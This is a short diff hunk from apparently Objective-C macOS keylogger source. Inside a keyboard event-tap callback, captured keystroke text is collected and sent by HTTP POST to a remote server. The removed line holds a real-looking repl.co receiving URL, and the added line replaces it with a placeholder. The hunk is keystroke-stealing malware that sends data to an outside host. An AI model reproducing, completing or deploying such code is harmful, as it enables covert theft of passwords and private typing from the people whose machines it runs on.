@@ -26,7 +26,7 @@ CGEventRef keyboardEvent(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
         s = output;
         output = @"";
         //url + sending data
-        NSURL *URL = [NSURL URLWithString:@"https://b51b6613-6ce0-4e52-9c70-1a80b7690bc8-00-3pubhbmtjo3wn.picard.repl.co/receive"];
+        NSURL *URL = [NSURL URLWithString:@"SERVER-ADDRESS-OMITTED"];
         NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:URL];
         [request setHTTPMethod:@"POST"];
         [request setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
